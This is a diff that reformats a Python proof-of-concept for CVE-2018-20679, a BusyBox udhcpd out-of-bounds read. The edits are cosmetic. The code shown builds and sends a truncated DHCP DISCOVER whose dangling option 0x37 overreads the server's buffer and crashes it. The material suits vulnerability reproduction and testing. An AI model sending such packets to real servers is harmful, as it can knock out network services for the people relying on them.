@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-PoC for CVE-2018-20679 — BusyBox udhcp out-of-bounds READ in udhcp_get_option().
+PoC for CVE-2018-20679 - BusyBox udhcp out-of-bounds READ in udhcp_get_option().
 
 CWE-125, CVSS 7.5. The bug lives in networking/udhcp/common.c and is, per the
-CVE, "consumed by the DHCP server, client, and relay" — this PoC drives the
+CVE, "consumed by the DHCP server, client, and relay" - this PoC drives the
 SERVER side (udhcpd, UDP 67).
 
 Root cause: udhcp_get_option() bounds its option-chain scan against
@@ -22,6 +22,7 @@ Usage:
     python3 poc_cve_2018_20679.py [host] [port]
     defaults: 127.0.0.1 67
 """
+
 import socket
 import struct
 import sys
@@ -31,9 +32,9 @@ DHCP_MAGIC = 0x63825363
 
 def build_truncated_discover() -> bytes:
     # --- BOOTP fixed header (236 bytes) ---
-    op = 1          # BOOTREQUEST
-    htype = 1       # Ethernet
-    hlen = 6        # MAC length
+    op = 1  # BOOTREQUEST
+    htype = 1  # Ethernet
+    hlen = 6  # MAC length
     hops = 0
     xid = 0xDEADBEEF
     secs = 0
@@ -42,7 +43,7 @@ def build_truncated_discover() -> bytes:
     yiaddr = b"\x00\x00\x00\x00"
     siaddr = b"\x00\x00\x00\x00"
     giaddr = b"\x00\x00\x00\x00"
-    chaddr = b"\x11\x22\x33\x44\x55\x66" + b"\x00" * 10   # 16 bytes
+    chaddr = b"\x11\x22\x33\x44\x55\x66" + b"\x00" * 10  # 16 bytes
     sname = b"\x00" * 64
     file_ = b"\x00" * 128
 
@@ -76,10 +77,11 @@ def main() -> int:
     port = int(sys.argv[2]) if len(sys.argv) > 2 else 67
 
     payload = build_truncated_discover()
-    print(f"[poc] sending {len(payload)} byte truncated DHCP DISCOVER "
-          f"to {host}:{port}/udp")
-    print("[poc] last option: [0x37][len=4] with NO data and NO DHCP_END "
-          "(0xff) -> drives the over-read past the received boundary")
+    print(f"[poc] sending {len(payload)} byte truncated DHCP DISCOVER to {host}:{port}/udp")
+    print(
+        "[poc] last option: [0x37][len=4] with NO data and NO DHCP_END "
+        "(0xff) -> drives the over-read past the received boundary"
+    )
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.settimeout(3.0)
@@ -87,8 +89,10 @@ def main() -> int:
     print("[poc] packet sent; server should ASan-abort in udhcp_get_option()")
     try:
         data, addr = s.recvfrom(2048)
-        print(f"[poc] unexpected reply ({len(data)} bytes) from {addr} "
-              "— server did not crash on this datagram")
+        print(
+            f"[poc] unexpected reply ({len(data)} bytes) from {addr} "
+            "- server did not crash on this datagram"
+        )
     except socket.timeout:
         print("[poc] no reply (expected): server crashed or stayed silent")
     finally:
